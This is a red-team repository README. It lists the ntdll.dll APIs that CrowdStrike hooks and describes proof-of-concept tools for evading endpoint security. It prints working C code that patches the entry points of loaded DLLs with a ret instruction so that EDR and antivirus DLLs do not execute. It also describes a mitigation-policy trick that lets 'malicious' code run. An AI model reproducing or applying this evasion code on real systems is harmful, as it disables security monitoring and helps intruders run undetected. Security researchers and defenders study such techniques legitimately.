# RedTeamCCode
Red Team C code repo

# CrowdStrike hooked ntdll.dll APIs

```
C:\Users\dev\Desktop>hook_finder_64.exe C:\Windows\System32\ntdll.dll
Loading C:\Windows\System32\ntdll.dll
------------------------------------------
BASE                    0x00007FFAE0030000      MZÉ
PE                      0x00007FFAE00300E8      PE
ExportTableOffset       0x00007FFAE01812A0
OffsetNameTable         0x00007FFAE01838C0
Function Counts         0x97e (2430)
------------------------------------------
NtAllocateVirtualMemory is hooked
NtAllocateVirtualMemoryEx is hooked
NtDeviceIoControlFile is hooked
NtGetContextThread is hooked
NtMapViewOfSection is hooked
NtMapViewOfSectionEx is hooked
NtProtectVirtualMemory is hooked
NtQueryInformationThread is hooked
NtQueueApcThread is hooked
NtQueueApcThreadEx is hooked
NtReadVirtualMemory is hooked
NtResumeThread is hooked
NtSetContextThread is hooked
NtSetInformationProcess is hooked
NtSetInformationThread is hooked
NtSuspendThread is hooked
NtUnmapViewOfSection is hooked
NtUnmapViewOfSectionEx is hooked
NtWriteVirtualMemory is hooked
ZwAllocateVirtualMemory is hooked
ZwAllocateVirtualMemoryEx is hooked
ZwDeviceIoControlFile is hooked
ZwGetContextThread is hooked
ZwMapViewOfSection is hooked
ZwMapViewOfSectionEx is hooked
ZwProtectVirtualMemory is hooked
ZwQueryInformationThread is hooked
ZwQueueApcThread is hooked
ZwQueueApcThreadEx is hooked
ZwReadVirtualMemory is hooked
ZwResumeThread is hooked
ZwSetContextThread is hooked
ZwSetInformationProcess is hooked
ZwSetInformationThread is hooked
ZwSuspendThread is hooked
ZwUnmapViewOfSection is hooked
ZwUnmapViewOfSectionEx is hooked
ZwWriteVirtualMemory is hooked
------------------------------------------
Completed
```

# PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON.c

Is a proof-of-concept for the `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` trick it will enforce the policy then spawn itself again the respawned process have the policy enforced allowing you run "malicious" code with the `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` been set.

# byebyedll.c

Is a proof-of-concept that enforce the `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` policy and also debug the child process (itself) and monitor Dlls that are loaded using Windows debugger APIs. It detect Dlls based on the path and patch it. The idea is to prevent EDR and AV Dlls loaded into your process from executing properly. This is a POC the blacklisted Dlls is set to `user32.dll`.  

The event is monitored using the `LOAD_DLL_DEBUG_EVENT` event. 

The DLL location is then retrieved using `event.u.UnloadDll.lpBaseOfDll`

The code is patched using the following functions:

```
VOID *GetEntryPointOffset(CHAR *start, DWORD dwSize, HANDLE hProc) {

    CHAR* mem = GlobalAlloc(GPTR, dwSize);
    DWORD dwBytesRead = 0;

    ReadProcessMemory(hProc, start, mem, dwSize, &dwBytesRead);

    DWORD dwBaseDLLInitializeOffset = *((DWORD*)mem + (0x120 / 4));

#ifdef DEBUG
    printf("dwBaseDLLInitializeOffset offset 0x%x\n", dwBaseDLLInitializeOffset);
#endif

    VOID *dwBaseDLLInitialize = (VOID*)start + dwBaseDLLInitializeOffset;

#ifdef DEBUG
    printf("dwBaseDLLInitialize offset 0x%p\n", dwBaseDLLInitialize);
#endif

    GlobalFree(mem);
    return dwBaseDLLInitialize;
}

VOID ModifyMem(CHAR *start, DWORD dwSize, HANDLE hProc) {
#ifdef DEBUG
    printf("Cleaning HANDLE 0x%p 0x%p length: %d\n", hProc, start, dwSize);
#endif
    VOID* EntryPoint = GetEntryPointOffset(start, dwSize, hProc);
    DWORD dwOut = 0;
    DWORD dwOld = 0;

#ifdef DEBUG
    printf("EntryPoint at 0x%p\n", EntryPoint);
#endif

    VirtualProtectEx(hProc, EntryPoint, 1, PAGE_READWRITE, &dwOld);
    WriteProcessMemory(hProc, EntryPoint, "\xc3", 1, &dwOut);
#ifdef DEBUG
    printf("Size of bytes written: %d\n", dwOut);
#endif
}
```

Verbose messages can be removed before the code is compiled by setting `DEBUG` as `FALSE`.

# Credit 
Mr.Un1k0d3r RingZer0 Team
